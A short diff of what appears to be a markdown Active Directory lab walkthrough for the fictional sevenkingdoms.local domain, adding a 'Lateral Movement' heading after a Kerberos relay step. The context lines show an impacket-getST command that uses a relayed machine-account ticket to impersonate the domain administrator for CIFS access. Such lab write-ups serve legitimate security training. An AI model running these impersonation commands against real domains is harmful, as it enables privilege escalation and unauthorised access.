@@ -480,3 +480,5 @@ export KRB5CCNAME=./krbrelay\$.ccache
 impacket-getST -impersonate 'administrator' -spn 'CIFS/castelblack.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'krbrelay$'
 
 ```
+
+### **Lateral Movement**
